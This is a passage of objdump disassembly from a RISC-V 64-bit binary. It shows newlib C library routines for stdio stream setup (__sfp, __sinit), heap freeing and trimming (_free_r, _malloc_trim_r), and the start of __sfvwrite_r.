   128f4:	52f53823          	sd	a5,1328(a0)
   128f8:	52053023          	sd	zero,1312(a0)
   128fc:	4791                	li	a5,4
   128fe:	892a                	mv	s2,a0
   12900:	c81c                	sw	a5,16(s0)
   12902:	4621                	li	a2,8
   12904:	4581                	li	a1,0
   12906:	0a042623          	sw	zero,172(s0)
   1290a:	00043023          	sd	zero,0(s0)
   1290e:	00043423          	sd	zero,8(s0)
   12912:	00043c23          	sd	zero,24(s0)
   12916:	02042023          	sw	zero,32(s0)
   1291a:	02042423          	sw	zero,40(s0)
   1291e:	0a440513          	addi	a0,s0,164
   12922:	d31fd0ef          	jal	ra,10652 <memset>
   12926:	01093483          	ld	s1,16(s2)
   1292a:	00004b17          	auipc	s6,0x4
   1292e:	594b0b13          	addi	s6,s6,1428 # 16ebe <__sread>
   12932:	00004a97          	auipc	s5,0x4
   12936:	5c8a8a93          	addi	s5,s5,1480 # 16efa <__swrite>
   1293a:	00004a17          	auipc	s4,0x4
   1293e:	614a0a13          	addi	s4,s4,1556 # 16f4e <__sseek>
   12942:	00004997          	auipc	s3,0x4
   12946:	64e98993          	addi	s3,s3,1614 # 16f90 <__sclose>
   1294a:	67c1                	lui	a5,0x10
   1294c:	03643c23          	sd	s6,56(s0)
   12950:	05543023          	sd	s5,64(s0)
   12954:	05443423          	sd	s4,72(s0)
   12958:	05343823          	sd	s3,80(s0)
   1295c:	f800                	sd	s0,48(s0)
   1295e:	07a5                	addi	a5,a5,9
   12960:	c89c                	sw	a5,16(s1)
   12962:	4621                	li	a2,8
   12964:	4581                	li	a1,0
   12966:	0a04a623          	sw	zero,172(s1)
   1296a:	0004b023          	sd	zero,0(s1)
   1296e:	0004b423          	sd	zero,8(s1)
   12972:	0004bc23          	sd	zero,24(s1)
   12976:	0204a023          	sw	zero,32(s1)
   1297a:	0204a423          	sw	zero,40(s1)
   1297e:	0a448513          	addi	a0,s1,164
   12982:	cd1fd0ef          	jal	ra,10652 <memset>
   12986:	01893403          	ld	s0,24(s2)
   1298a:	000207b7          	lui	a5,0x20
   1298e:	0364bc23          	sd	s6,56(s1)
   12992:	0554b023          	sd	s5,64(s1)
   12996:	0544b423          	sd	s4,72(s1)
   1299a:	0534b823          	sd	s3,80(s1)
   1299e:	f884                	sd	s1,48(s1)
   129a0:	07c9                	addi	a5,a5,18
   129a2:	c81c                	sw	a5,16(s0)
   129a4:	0a042623          	sw	zero,172(s0)
   129a8:	00043023          	sd	zero,0(s0)
   129ac:	00043423          	sd	zero,8(s0)
   129b0:	00043c23          	sd	zero,24(s0)
   129b4:	02042023          	sw	zero,32(s0)
   129b8:	02042423          	sw	zero,40(s0)
   129bc:	0a440513          	addi	a0,s0,164
   129c0:	4621                	li	a2,8
   129c2:	4581                	li	a1,0
   129c4:	c8ffd0ef          	jal	ra,10652 <memset>
   129c8:	70e2                	ld	ra,56(sp)
   129ca:	03643c23          	sd	s6,56(s0)
   129ce:	05543023          	sd	s5,64(s0)
   129d2:	05443423          	sd	s4,72(s0)
   129d6:	05343823          	sd	s3,80(s0)
   129da:	f800                	sd	s0,48(s0)
   129dc:	7442                	ld	s0,48(sp)
   129de:	4785                	li	a5,1
   129e0:	04f92823          	sw	a5,80(s2)
   129e4:	74a2                	ld	s1,40(sp)
   129e6:	7902                	ld	s2,32(sp)
   129e8:	69e2                	ld	s3,24(sp)
   129ea:	6a42                	ld	s4,16(sp)
   129ec:	6aa2                	ld	s5,8(sp)
   129ee:	6b02                	ld	s6,0(sp)
   129f0:	6121                	addi	sp,sp,64
   129f2:	8082                	ret

00000000000129f4 <__fp_unlock>:
   129f4:	4501                	li	a0,0
   129f6:	8082                	ret

00000000000129f8 <__sfmoreglue>:
   129f8:	1101                	addi	sp,sp,-32
   129fa:	e426                	sd	s1,8(sp)
   129fc:	0b000613          	li	a2,176
   12a00:	fff5849b          	addiw	s1,a1,-1
   12a04:	02c484b3          	mul	s1,s1,a2
   12a08:	e04a                	sd	s2,0(sp)
   12a0a:	892e                	mv	s2,a1
   12a0c:	e822                	sd	s0,16(sp)
   12a0e:	ec06                	sd	ra,24(sp)
   12a10:	0c848593          	addi	a1,s1,200
   12a14:	315020ef          	jal	ra,15528 <_malloc_r>
   12a18:	842a                	mv	s0,a0
   12a1a:	cd01                	beqz	a0,12a32 <__sfmoreglue+0x3a>
   12a1c:	0561                	addi	a0,a0,24
   12a1e:	00043023          	sd	zero,0(s0)
   12a22:	01242423          	sw	s2,8(s0)
   12a26:	e808                	sd	a0,16(s0)
   12a28:	0b048613          	addi	a2,s1,176
   12a2c:	4581                	li	a1,0
   12a2e:	c25fd0ef          	jal	ra,10652 <memset>
   12a32:	60e2                	ld	ra,24(sp)
   12a34:	8522                	mv	a0,s0
   12a36:	6442                	ld	s0,16(sp)
   12a38:	64a2                	ld	s1,8(sp)
   12a3a:	6902                	ld	s2,0(sp)
   12a3c:	6105                	addi	sp,sp,32
   12a3e:	8082                	ret

0000000000012a40 <__sfp>:
   12a40:	7179                	addi	sp,sp,-48
   12a42:	ec26                	sd	s1,24(sp)
   12a44:	8301b483          	ld	s1,-2000(gp) # 1f438 <_global_impure_ptr>
   12a48:	48bc                	lw	a5,80(s1)
   12a4a:	e84a                	sd	s2,16(sp)
   12a4c:	f406                	sd	ra,40(sp)
   12a4e:	f022                	sd	s0,32(sp)
   12a50:	e44e                	sd	s3,8(sp)
   12a52:	892a                	mv	s2,a0
   12a54:	c3c9                	beqz	a5,12ad6 <__sfp+0x96>
   12a56:	52048493          	addi	s1,s1,1312
   12a5a:	0b000993          	li	s3,176
   12a5e:	449c                	lw	a5,8(s1)
   12a60:	6880                	ld	s0,16(s1)
   12a62:	06f05663          	blez	a5,12ace <__sfp+0x8e>
   12a66:	37fd                	addiw	a5,a5,-1
   12a68:	1782                	slli	a5,a5,0x20
   12a6a:	9381                	srli	a5,a5,0x20
   12a6c:	0785                	addi	a5,a5,1
   12a6e:	033787b3          	mul	a5,a5,s3
   12a72:	97a2                	add	a5,a5,s0
   12a74:	a029                	j	12a7e <__sfp+0x3e>
   12a76:	0b040413          	addi	s0,s0,176
   12a7a:	04878a63          	beq	a5,s0,12ace <__sfp+0x8e>
   12a7e:	01041703          	lh	a4,16(s0)
   12a82:	fb75                	bnez	a4,12a76 <__sfp+0x36>
   12a84:	77c1                	lui	a5,0xffff0
   12a86:	0785                	addi	a5,a5,1
   12a88:	0a042623          	sw	zero,172(s0)
   12a8c:	00043023          	sd	zero,0(s0)
   12a90:	00043423          	sd	zero,8(s0)
   12a94:	c81c                	sw	a5,16(s0)
   12a96:	00043c23          	sd	zero,24(s0)
   12a9a:	02042023          	sw	zero,32(s0)
   12a9e:	02042423          	sw	zero,40(s0)
   12aa2:	4621                	li	a2,8
   12aa4:	4581                	li	a1,0
   12aa6:	0a440513          	addi	a0,s0,164
   12aaa:	ba9fd0ef          	jal	ra,10652 <memset>
   12aae:	04043c23          	sd	zero,88(s0)
   12ab2:	06042023          	sw	zero,96(s0)
   12ab6:	06043c23          	sd	zero,120(s0)
   12aba:	08042023          	sw	zero,128(s0)
   12abe:	70a2                	ld	ra,40(sp)
   12ac0:	8522                	mv	a0,s0
   12ac2:	7402                	ld	s0,32(sp)
   12ac4:	64e2                	ld	s1,24(sp)
   12ac6:	6942                	ld	s2,16(sp)
   12ac8:	69a2                	ld	s3,8(sp)
   12aca:	6145                	addi	sp,sp,48
   12acc:	8082                	ret
   12ace:	6080                	ld	s0,0(s1)
   12ad0:	c419                	beqz	s0,12ade <__sfp+0x9e>
   12ad2:	84a2                	mv	s1,s0
   12ad4:	b769                	j	12a5e <__sfp+0x1e>
   12ad6:	8526                	mv	a0,s1
   12ad8:	df5ff0ef          	jal	ra,128cc <__sinit.part.0>
   12adc:	bfad                	j	12a56 <__sfp+0x16>
   12ade:	4591                	li	a1,4
   12ae0:	854a                	mv	a0,s2
   12ae2:	f17ff0ef          	jal	ra,129f8 <__sfmoreglue>
   12ae6:	e088                	sd	a0,0(s1)
   12ae8:	842a                	mv	s0,a0
   12aea:	f565                	bnez	a0,12ad2 <__sfp+0x92>
   12aec:	47b1                	li	a5,12
   12aee:	00f92023          	sw	a5,0(s2)
   12af2:	b7f1                	j	12abe <__sfp+0x7e>

0000000000012af4 <_cleanup>:
   12af4:	00007597          	auipc	a1,0x7
   12af8:	14458593          	addi	a1,a1,324 # 19c38 <_fclose_r>
   12afc:	8301b503          	ld	a0,-2000(gp) # 1f438 <_global_impure_ptr>
   12b00:	af05                	j	13230 <_fwalk_reent>

0000000000012b02 <__sinit>:
   12b02:	493c                	lw	a5,80(a0)
   12b04:	c391                	beqz	a5,12b08 <__sinit+0x6>
   12b06:	8082                	ret
   12b08:	b3d1                	j	128cc <__sinit.part.0>

0000000000012b0a <__sfp_lock_acquire>:
   12b0a:	8082                	ret

0000000000012b0c <__sfp_lock_release>:
   12b0c:	8082                	ret

0000000000012b0e <__sinit_lock_acquire>:
   12b0e:	8082                	ret

0000000000012b10 <__sinit_lock_release>:
   12b10:	8082                	ret

0000000000012b12 <__fp_lock_all>:
   12b12:	00000597          	auipc	a1,0x0
   12b16:	daa58593          	addi	a1,a1,-598 # 128bc <__fp_lock>
   12b1a:	8481b503          	ld	a0,-1976(gp) # 1f450 <_impure_ptr>
   12b1e:	ad41                	j	131ae <_fwalk>

0000000000012b20 <__fp_unlock_all>:
   12b20:	00000597          	auipc	a1,0x0
   12b24:	ed458593          	addi	a1,a1,-300 # 129f4 <__fp_unlock>
   12b28:	8481b503          	ld	a0,-1976(gp) # 1f450 <_impure_ptr>
   12b2c:	a549                	j	131ae <_fwalk>

0000000000012b2e <__libc_fini_array>:
   12b2e:	1101                	addi	sp,sp,-32
   12b30:	e822                	sd	s0,16(sp)
   12b32:	0000b797          	auipc	a5,0xb
   12b36:	7d678793          	addi	a5,a5,2006 # 1e308 <__fini_array_end>
   12b3a:	0000b417          	auipc	s0,0xb
   12b3e:	7c640413          	addi	s0,s0,1990 # 1e300 <__init_array_end>
   12b42:	8f81                	sub	a5,a5,s0
   12b44:	e426                	sd	s1,8(sp)
   12b46:	ec06                	sd	ra,24(sp)
   12b48:	4037d493          	srai	s1,a5,0x3
   12b4c:	c881                	beqz	s1,12b5c <__libc_fini_array+0x2e>
   12b4e:	17e1                	addi	a5,a5,-8
   12b50:	943e                	add	s0,s0,a5
   12b52:	601c                	ld	a5,0(s0)
   12b54:	14fd                	addi	s1,s1,-1
   12b56:	1461                	addi	s0,s0,-8
   12b58:	9782                	jalr	a5
   12b5a:	fce5                	bnez	s1,12b52 <__libc_fini_array+0x24>
   12b5c:	60e2                	ld	ra,24(sp)
   12b5e:	6442                	ld	s0,16(sp)
   12b60:	64a2                	ld	s1,8(sp)
   12b62:	6105                	addi	sp,sp,32
   12b64:	8082                	ret

0000000000012b66 <_malloc_trim_r>:
   12b66:	7179                	addi	sp,sp,-48
   12b68:	f022                	sd	s0,32(sp)
   12b6a:	ec26                	sd	s1,24(sp)
   12b6c:	e84a                	sd	s2,16(sp)
   12b6e:	e44e                	sd	s3,8(sp)
   12b70:	e052                	sd	s4,0(sp)
   12b72:	89ae                	mv	s3,a1
   12b74:	f406                	sd	ra,40(sp)
   12b76:	0000ca17          	auipc	s4,0xc
   12b7a:	082a0a13          	addi	s4,s4,130 # 1ebf8 <__malloc_av_>
   12b7e:	892a                	mv	s2,a0
   12b80:	26a030ef          	jal	ra,15dea <__malloc_lock>
   12b84:	010a3703          	ld	a4,16(s4)
   12b88:	6785                	lui	a5,0x1
   12b8a:	fdf78413          	addi	s0,a5,-33 # fdf <register_fini-0xf0d1>
   12b8e:	6704                	ld	s1,8(a4)
   12b90:	41340433          	sub	s0,s0,s3
   12b94:	98f1                	andi	s1,s1,-4
   12b96:	9426                	add	s0,s0,s1
   12b98:	8031                	srli	s0,s0,0xc
   12b9a:	147d                	addi	s0,s0,-1
   12b9c:	0432                	slli	s0,s0,0xc
   12b9e:	00f44b63          	blt	s0,a5,12bb4 <_malloc_trim_r+0x4e>
   12ba2:	4581                	li	a1,0
   12ba4:	854a                	mv	a0,s2
   12ba6:	1d4040ef          	jal	ra,16d7a <_sbrk_r>
   12baa:	010a3783          	ld	a5,16(s4)
   12bae:	97a6                	add	a5,a5,s1
   12bb0:	00f50e63          	beq	a0,a5,12bcc <_malloc_trim_r+0x66>
   12bb4:	854a                	mv	a0,s2
   12bb6:	236030ef          	jal	ra,15dec <__malloc_unlock>
   12bba:	70a2                	ld	ra,40(sp)
   12bbc:	7402                	ld	s0,32(sp)
   12bbe:	64e2                	ld	s1,24(sp)
   12bc0:	6942                	ld	s2,16(sp)
   12bc2:	69a2                	ld	s3,8(sp)
   12bc4:	6a02                	ld	s4,0(sp)
   12bc6:	4501                	li	a0,0
   12bc8:	6145                	addi	sp,sp,48
   12bca:	8082                	ret
   12bcc:	408005b3          	neg	a1,s0
   12bd0:	854a                	mv	a0,s2
   12bd2:	1a8040ef          	jal	ra,16d7a <_sbrk_r>
   12bd6:	57fd                	li	a5,-1
   12bd8:	02f50a63          	beq	a0,a5,12c0c <_malloc_trim_r+0xa6>
   12bdc:	0c018713          	addi	a4,gp,192 # 1fcc8 <__malloc_current_mallinfo>
   12be0:	431c                	lw	a5,0(a4)
   12be2:	010a3683          	ld	a3,16(s4)
   12be6:	8c81                	sub	s1,s1,s0
   12be8:	0014e493          	ori	s1,s1,1
   12bec:	4087843b          	subw	s0,a5,s0
   12bf0:	854a                	mv	a0,s2
   12bf2:	e684                	sd	s1,8(a3)
   12bf4:	c300                	sw	s0,0(a4)
   12bf6:	1f6030ef          	jal	ra,15dec <__malloc_unlock>
   12bfa:	70a2                	ld	ra,40(sp)
   12bfc:	7402                	ld	s0,32(sp)
   12bfe:	64e2                	ld	s1,24(sp)
   12c00:	6942                	ld	s2,16(sp)
   12c02:	69a2                	ld	s3,8(sp)
   12c04:	6a02                	ld	s4,0(sp)
   12c06:	4505                	li	a0,1
   12c08:	6145                	addi	sp,sp,48
   12c0a:	8082                	ret
   12c0c:	4581                	li	a1,0
   12c0e:	854a                	mv	a0,s2
   12c10:	16a040ef          	jal	ra,16d7a <_sbrk_r>
   12c14:	010a3703          	ld	a4,16(s4)
   12c18:	46fd                	li	a3,31
   12c1a:	40e507b3          	sub	a5,a0,a4
   12c1e:	f8f6dbe3          	bge	a3,a5,12bb4 <_malloc_trim_r+0x4e>
   12c22:	8501b683          	ld	a3,-1968(gp) # 1f458 <__malloc_sbrk_base>
   12c26:	8d15                	sub	a0,a0,a3
   12c28:	0017e793          	ori	a5,a5,1
   12c2c:	0ca1a023          	sw	a0,192(gp) # 1fcc8 <__malloc_current_mallinfo>
   12c30:	e71c                	sd	a5,8(a4)
   12c32:	b749                	j	12bb4 <_malloc_trim_r+0x4e>

0000000000012c34 <_free_r>:
   12c34:	c5f5                	beqz	a1,12d20 <_free_r+0xec>
   12c36:	1101                	addi	sp,sp,-32
   12c38:	e822                	sd	s0,16(sp)
   12c3a:	e426                	sd	s1,8(sp)
   12c3c:	842e                	mv	s0,a1
   12c3e:	84aa                	mv	s1,a0
   12c40:	ec06                	sd	ra,24(sp)
   12c42:	1a8030ef          	jal	ra,15dea <__malloc_lock>
   12c46:	ff843583          	ld	a1,-8(s0)
   12c4a:	ff040713          	addi	a4,s0,-16
   12c4e:	0000c517          	auipc	a0,0xc
   12c52:	faa50513          	addi	a0,a0,-86 # 1ebf8 <__malloc_av_>
   12c56:	ffe5f793          	andi	a5,a1,-2
   12c5a:	00f70633          	add	a2,a4,a5
   12c5e:	6614                	ld	a3,8(a2)
   12c60:	01053803          	ld	a6,16(a0)
   12c64:	9af1                	andi	a3,a3,-4
   12c66:	14c80063          	beq	a6,a2,12da6 <_free_r+0x172>
   12c6a:	e614                	sd	a3,8(a2)
   12c6c:	8985                	andi	a1,a1,1
   12c6e:	00d60833          	add	a6,a2,a3
   12c72:	e1c1                	bnez	a1,12cf2 <_free_r+0xbe>
   12c74:	ff043303          	ld	t1,-16(s0)
   12c78:	00883583          	ld	a1,8(a6)
   12c7c:	0000c897          	auipc	a7,0xc
   12c80:	f8c88893          	addi	a7,a7,-116 # 1ec08 <__malloc_av_+0x10>
   12c84:	40670733          	sub	a4,a4,t1
   12c88:	01073803          	ld	a6,16(a4)
   12c8c:	979a                	add	a5,a5,t1
   12c8e:	8985                	andi	a1,a1,1
   12c90:	0f180863          	beq	a6,a7,12d80 <_free_r+0x14c>
   12c94:	01873303          	ld	t1,24(a4)
   12c98:	00683c23          	sd	t1,24(a6)
   12c9c:	01033823          	sd	a6,16(t1)
   12ca0:	14058d63          	beqz	a1,12dfa <_free_r+0x1c6>
   12ca4:	0017e693          	ori	a3,a5,1
   12ca8:	e714                	sd	a3,8(a4)
   12caa:	e21c                	sd	a5,0(a2)
   12cac:	1ff00693          	li	a3,511
   12cb0:	08f6e263          	bltu	a3,a5,12d34 <_free_r+0x100>
   12cb4:	838d                	srli	a5,a5,0x3
   12cb6:	0017869b          	addiw	a3,a5,1
   12cba:	0016969b          	slliw	a3,a3,0x1
   12cbe:	068e                	slli	a3,a3,0x3
   12cc0:	00853803          	ld	a6,8(a0)
   12cc4:	96aa                	add	a3,a3,a0
   12cc6:	628c                	ld	a1,0(a3)
   12cc8:	4027d61b          	sraiw	a2,a5,0x2
   12ccc:	4785                	li	a5,1
   12cce:	00c797b3          	sll	a5,a5,a2
   12cd2:	0107e7b3          	or	a5,a5,a6
   12cd6:	ff068613          	addi	a2,a3,-16
   12cda:	ef10                	sd	a2,24(a4)
   12cdc:	eb0c                	sd	a1,16(a4)
   12cde:	e51c                	sd	a5,8(a0)
   12ce0:	e298                	sd	a4,0(a3)
   12ce2:	ed98                	sd	a4,24(a1)
   12ce4:	6442                	ld	s0,16(sp)
   12ce6:	60e2                	ld	ra,24(sp)
   12ce8:	8526                	mv	a0,s1
   12cea:	64a2                	ld	s1,8(sp)
   12cec:	6105                	addi	sp,sp,32
   12cee:	0fe0306f          	j	15dec <__malloc_unlock>
   12cf2:	00883583          	ld	a1,8(a6)
   12cf6:	8985                	andi	a1,a1,1
   12cf8:	e58d                	bnez	a1,12d22 <_free_r+0xee>
   12cfa:	97b6                	add	a5,a5,a3
   12cfc:	0000c897          	auipc	a7,0xc
   12d00:	f0c88893          	addi	a7,a7,-244 # 1ec08 <__malloc_av_+0x10>
   12d04:	6a14                	ld	a3,16(a2)
   12d06:	0017e813          	ori	a6,a5,1
   12d0a:	00f705b3          	add	a1,a4,a5
   12d0e:	11168063          	beq	a3,a7,12e0e <_free_r+0x1da>
   12d12:	6e10                	ld	a2,24(a2)
   12d14:	ee90                	sd	a2,24(a3)
   12d16:	ea14                	sd	a3,16(a2)
   12d18:	01073423          	sd	a6,8(a4)
   12d1c:	e19c                	sd	a5,0(a1)
   12d1e:	b779                	j	12cac <_free_r+0x78>
   12d20:	8082                	ret
   12d22:	0017e693          	ori	a3,a5,1
   12d26:	fed43c23          	sd	a3,-8(s0)
   12d2a:	e21c                	sd	a5,0(a2)
   12d2c:	1ff00693          	li	a3,511
   12d30:	f8f6f2e3          	bgeu	a3,a5,12cb4 <_free_r+0x80>
   12d34:	0097d693          	srli	a3,a5,0x9
   12d38:	4611                	li	a2,4
   12d3a:	08d66f63          	bltu	a2,a3,12dd8 <_free_r+0x1a4>
   12d3e:	0067d693          	srli	a3,a5,0x6
   12d42:	0396859b          	addiw	a1,a3,57
   12d46:	0015959b          	slliw	a1,a1,0x1
   12d4a:	0386861b          	addiw	a2,a3,56
   12d4e:	058e                	slli	a1,a1,0x3
   12d50:	95aa                	add	a1,a1,a0
   12d52:	6194                	ld	a3,0(a1)
   12d54:	15c1                	addi	a1,a1,-16
   12d56:	0cd58663          	beq	a1,a3,12e22 <_free_r+0x1ee>
   12d5a:	6690                	ld	a2,8(a3)
   12d5c:	9a71                	andi	a2,a2,-4
   12d5e:	00c7f563          	bgeu	a5,a2,12d68 <_free_r+0x134>
   12d62:	6a94                	ld	a3,16(a3)
   12d64:	fed59be3          	bne	a1,a3,12d5a <_free_r+0x126>
   12d68:	6e8c                	ld	a1,24(a3)
   12d6a:	ef0c                	sd	a1,24(a4)
   12d6c:	eb14                	sd	a3,16(a4)
   12d6e:	6442                	ld	s0,16(sp)
   12d70:	60e2                	ld	ra,24(sp)
   12d72:	e998                	sd	a4,16(a1)
   12d74:	8526                	mv	a0,s1
   12d76:	64a2                	ld	s1,8(sp)
   12d78:	ee98                	sd	a4,24(a3)
   12d7a:	6105                	addi	sp,sp,32
   12d7c:	0700306f          	j	15dec <__malloc_unlock>
   12d80:	0e059d63          	bnez	a1,12e7a <_free_r+0x246>
   12d84:	6e0c                	ld	a1,24(a2)
   12d86:	6a10                	ld	a2,16(a2)
   12d88:	97b6                	add	a5,a5,a3
   12d8a:	6442                	ld	s0,16(sp)
   12d8c:	ee0c                	sd	a1,24(a2)
   12d8e:	e990                	sd	a2,16(a1)
   12d90:	0017e693          	ori	a3,a5,1
   12d94:	60e2                	ld	ra,24(sp)
   12d96:	e714                	sd	a3,8(a4)
   12d98:	8526                	mv	a0,s1
   12d9a:	973e                	add	a4,a4,a5
   12d9c:	64a2                	ld	s1,8(sp)
   12d9e:	e31c                	sd	a5,0(a4)
   12da0:	6105                	addi	sp,sp,32
   12da2:	04a0306f          	j	15dec <__malloc_unlock>
   12da6:	8985                	andi	a1,a1,1
   12da8:	97b6                	add	a5,a5,a3
   12daa:	e989                	bnez	a1,12dbc <_free_r+0x188>
   12dac:	ff043583          	ld	a1,-16(s0)
   12db0:	8f0d                	sub	a4,a4,a1
   12db2:	6f14                	ld	a3,24(a4)
   12db4:	6b10                	ld	a2,16(a4)
   12db6:	97ae                	add	a5,a5,a1
   12db8:	ee14                	sd	a3,24(a2)
   12dba:	ea90                	sd	a2,16(a3)
   12dbc:	0017e693          	ori	a3,a5,1
   12dc0:	e714                	sd	a3,8(a4)
   12dc2:	e918                	sd	a4,16(a0)
   12dc4:	8581b703          	ld	a4,-1960(gp) # 1f460 <__malloc_trim_threshold>
   12dc8:	f0e7eee3          	bltu	a5,a4,12ce4 <_free_r+0xb0>
   12dcc:	8781b583          	ld	a1,-1928(gp) # 1f480 <__malloc_top_pad>
   12dd0:	8526                	mv	a0,s1
   12dd2:	d95ff0ef          	jal	ra,12b66 <_malloc_trim_r>
   12dd6:	b739                	j	12ce4 <_free_r+0xb0>
   12dd8:	4651                	li	a2,20
   12dda:	02d67263          	bgeu	a2,a3,12dfe <_free_r+0x1ca>
   12dde:	05400613          	li	a2,84
   12de2:	04d66b63          	bltu	a2,a3,12e38 <_free_r+0x204>
   12de6:	00c7d693          	srli	a3,a5,0xc
   12dea:	06f6859b          	addiw	a1,a3,111
   12dee:	0015959b          	slliw	a1,a1,0x1
   12df2:	06e6861b          	addiw	a2,a3,110
   12df6:	058e                	slli	a1,a1,0x3
   12df8:	bfa1                	j	12d50 <_free_r+0x11c>
   12dfa:	97b6                	add	a5,a5,a3
   12dfc:	b721                	j	12d04 <_free_r+0xd0>
   12dfe:	05c6859b          	addiw	a1,a3,92
   12e02:	0015959b          	slliw	a1,a1,0x1
   12e06:	05b6861b          	addiw	a2,a3,91
   12e0a:	058e                	slli	a1,a1,0x3
   12e0c:	b791                	j	12d50 <_free_r+0x11c>
   12e0e:	f518                	sd	a4,40(a0)
   12e10:	f118                	sd	a4,32(a0)
   12e12:	01173c23          	sd	a7,24(a4)
   12e16:	01173823          	sd	a7,16(a4)
   12e1a:	01073423          	sd	a6,8(a4)
   12e1e:	e19c                	sd	a5,0(a1)
   12e20:	b5d1                	j	12ce4 <_free_r+0xb0>
   12e22:	00853803          	ld	a6,8(a0)
   12e26:	4026561b          	sraiw	a2,a2,0x2
   12e2a:	4785                	li	a5,1
   12e2c:	00c79633          	sll	a2,a5,a2
   12e30:	01066633          	or	a2,a2,a6
   12e34:	e510                	sd	a2,8(a0)
   12e36:	bf15                	j	12d6a <_free_r+0x136>
   12e38:	15400613          	li	a2,340
   12e3c:	00d66c63          	bltu	a2,a3,12e54 <_free_r+0x220>
   12e40:	00f7d693          	srli	a3,a5,0xf
   12e44:	0786859b          	addiw	a1,a3,120
   12e48:	0015959b          	slliw	a1,a1,0x1
   12e4c:	0776861b          	addiw	a2,a3,119
   12e50:	058e                	slli	a1,a1,0x3
   12e52:	bdfd                	j	12d50 <_free_r+0x11c>
   12e54:	55400613          	li	a2,1364
   12e58:	00d66c63          	bltu	a2,a3,12e70 <_free_r+0x23c>
   12e5c:	0127d693          	srli	a3,a5,0x12
   12e60:	07d6859b          	addiw	a1,a3,125
   12e64:	0015959b          	slliw	a1,a1,0x1
   12e68:	07c6861b          	addiw	a2,a3,124
   12e6c:	058e                	slli	a1,a1,0x3
   12e6e:	b5cd                	j	12d50 <_free_r+0x11c>
   12e70:	7f000593          	li	a1,2032
   12e74:	07e00613          	li	a2,126
   12e78:	bde1                	j	12d50 <_free_r+0x11c>
   12e7a:	0017e693          	ori	a3,a5,1
   12e7e:	e714                	sd	a3,8(a4)
   12e80:	e21c                	sd	a5,0(a2)
   12e82:	b58d                	j	12ce4 <_free_r+0xb0>

0000000000012e84 <__sfvwrite_r>:
   12e84:	6a1c                	ld	a5,16(a2)
   12e86:	1a078c63          	beqz	a5,1303e <__sfvwrite_r+0x1ba>
   12e8a:	0105d783          	lhu	a5,16(a1)
   12e8e:	711d                	addi	sp,sp,-96
   12e90:	e8a2                	sd	s0,80(sp)
   12e92:	f852                	sd	s4,48(sp)
   12e94:	f456                	sd	s5,40(sp)
   12e96:	ec86                	sd	ra,88(sp)
   12e98:	e4a6                	sd	s1,72(sp)
   12e9a:	e0ca                	sd	s2,64(sp)
   12e9c:	fc4e                	sd	s3,56(sp)
   12e9e:	f05a                	sd	s6,32(sp)
   12ea0:	ec5e                	sd	s7,24(sp)
   12ea2:	e862                	sd	s8,16(sp)
   12ea4:	e466                	sd	s9,8(sp)
   12ea6:	e06a                	sd	s10,0(sp)
   12ea8:	0087f713          	andi	a4,a5,8
   12eac:	8a32                	mv	s4,a2
   12eae:	8aaa                	mv	s5,a0
   12eb0:	842e                	mv	s0,a1
   12eb2:	c325                	beqz	a4,12f12 <__sfvwrite_r+0x8e>
   12eb4:	6d98                	ld	a4,24(a1)
   12eb6:	cf31                	beqz	a4,12f12 <__sfvwrite_r+0x8e>
   12eb8:	0027f713          	andi	a4,a5,2
   12ebc:	000a3903          	ld	s2,0(s4)
   12ec0:	c735                	beqz	a4,12f2c <__sfvwrite_r+0xa8>
   12ec2:	603c                	ld	a5,64(s0)
   12ec4:	780c                	ld	a1,48(s0)
   12ec6:	80000b37          	lui	s6,0x80000
   12eca:	4981                	li	s3,0
   12ecc:	4481                	li	s1,0
   12ece:	c00b4b13          	xori	s6,s6,-1024
   12ed2:	864e                	mv	a2,s3
   12ed4:	8556                	mv	a0,s5
   12ed6:	c885                	beqz	s1,12f06 <__sfvwrite_r+0x82>
   12ed8:	86a6                	mv	a3,s1
   12eda:	009b7363          	bgeu	s6,s1,12ee0 <__sfvwrite_r+0x5c>
   12ede:	86da                	mv	a3,s6
   12ee0:	2681                	sext.w	a3,a3
   12ee2:	9782                	jalr	a5
   12ee4:	14a05563          	blez	a0,1302e <__sfvwrite_r+0x1aa>
   12ee8:	010a3783          	ld	a5,16(s4)
   12eec:	99aa                	add	s3,s3,a0
   12eee:	8c89                	sub	s1,s1,a0
   12ef0:	40a78533          	sub	a0,a5,a0
   12ef4:	00aa3823          	sd	a0,16(s4)
   12ef8:	10050763          	beqz	a0,13006 <__sfvwrite_r+0x182>
   12efc:	603c                	ld	a5,64(s0)
   12efe:	780c                	ld	a1,48(s0)
   12f00:	864e                	mv	a2,s3
   12f02:	8556                	mv	a0,s5
   12f04:	f8f1                	bnez	s1,12ed8 <__sfvwrite_r+0x54>
   12f06:	00093983          	ld	s3,0(s2)
   12f0a:	00893483          	ld	s1,8(s2)
   12f0e:	0941                	addi	s2,s2,16
   12f10:	b7c9                	j	12ed2 <__sfvwrite_r+0x4e>
   12f12:	85a2                	mv	a1,s0
   12f14:	8556                	mv	a0,s5
   12f16:	e0cff0ef          	jal	ra,12522 <__swsetup_r>
   12f1a:	28051863          	bnez	a0,131aa <__sfvwrite_r+0x326>
   12f1e:	01045783          	lhu	a5,16(s0)
   12f22:	000a3903          	ld	s2,0(s4)
   12f26:	0027f713          	andi	a4,a5,2
   12f2a:	ff41                	bnez	a4,12ec2 <__sfvwrite_r+0x3e>
   12f2c:	0017f713          	andi	a4,a5,1
   12f30:	eb35                	bnez	a4,12fa4 <__sfvwrite_r+0x120>
   12f32:	4444                	lw	s1,12(s0)
   12f34:	6008                	ld	a0,0(s0)
   12f36:	80000b37          	lui	s6,0x80000
   12f3a:	ffeb4b93          	xori	s7,s6,-2
   12f3e:	4c01                	li	s8,0
   12f40:	4981                	li	s3,0
   12f42:	fffb4b13          	not	s6,s6
   12f46:	8ca6                	mv	s9,s1
   12f48:	04098863          	beqz	s3,12f98 <__sfvwrite_r+0x114>
   12f4c:	2007f713          	andi	a4,a5,512
   12f50:	12070a63          	beqz	a4,13084 <__sfvwrite_r+0x200>
   12f54:	8d26                	mv	s10,s1
   12f56:	1899f763          	bgeu	s3,s1,130e4 <__sfvwrite_r+0x260>
   12f5a:	8cce                	mv	s9,s3
   12f5c:	8d4e                	mv	s10,s3
   12f5e:	866a                	mv	a2,s10
   12f60:	85e2                	mv	a1,s8
   12f62:	5b3020ef          	jal	ra,15d14 <memmove>
   12f66:	4458                	lw	a4,12(s0)
   12f68:	601c                	ld	a5,0(s0)
   12f6a:	84ce                	mv	s1,s3
   12f6c:	41970cbb          	subw	s9,a4,s9
   12f70:	97ea                	add	a5,a5,s10
   12f72:	01942623          	sw	s9,12(s0)
   12f76:	e01c                	sd	a5,0(s0)
